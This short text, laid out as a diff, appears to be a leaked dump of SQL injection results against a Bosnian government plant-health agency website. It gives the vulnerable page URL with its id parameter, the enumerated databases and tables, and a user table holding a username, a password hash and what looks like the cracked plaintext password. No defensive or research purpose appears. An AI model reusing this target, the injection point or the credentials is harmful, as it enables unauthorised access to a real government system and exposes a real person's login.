@@ -1,0 +1,37 @@
+.gov government 	 
+
+.ba Bosnia and Herzegovina
+
+Bosnia and Herzegovina Plant Health Protection Administration.
+
+Bosnia and Herzegovina Phytosanitary Administration.
+
+ISP 	mCloud VMs
+
+http://sortnalistabih.uzzb.gov.ba/kulture.php?id=1
+
+available databases [2]:
+[+] admin_sorte
+[+] information_schema
+
+Database: admin_sorte
+[8 tables]
++--------------+
+| glavna       |
+| izvor_prijav |
+| kulture      |
+| napomena1    |
+| napomena2    |
+| odrzavaoci   |
+| sorte        |
+| tbl_users    |
++--------------+
+
+Database: admin_sorte
+Table: tbl_users
+[1 entry]
++-----------+--------------------------------------------+
+| user_name | password                                   |
++-----------+--------------------------------------------+
+| mitar     | 8d452097f9b37a746ccf7e84c2d63a00 ( bomim ) |
++-----------+--------------------------------------------+
